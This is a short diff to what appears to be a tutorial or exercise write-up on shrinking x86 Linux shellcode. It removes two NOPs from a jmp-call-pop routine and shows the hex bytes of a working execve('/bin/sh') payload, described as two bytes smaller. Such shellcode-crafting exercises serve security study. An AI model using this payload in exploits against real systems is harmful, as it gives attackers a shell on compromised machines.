@@ -37,8 +37,6 @@ section .text
 _start:
 
 	jmp short two
-	nop
-	nop
 
 one:
 	pop    ebx
@@ -64,6 +62,7 @@ Original version:
 Modified:
 
 	"\xEB\x09\x5B\x31\xC0\x99\x91\xB0\x0B\xCD\x80\xE8\xF2\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F\x73\x68"
+
 
 This is **2 bytes smaller**! Bonus points ya'll o/.
 
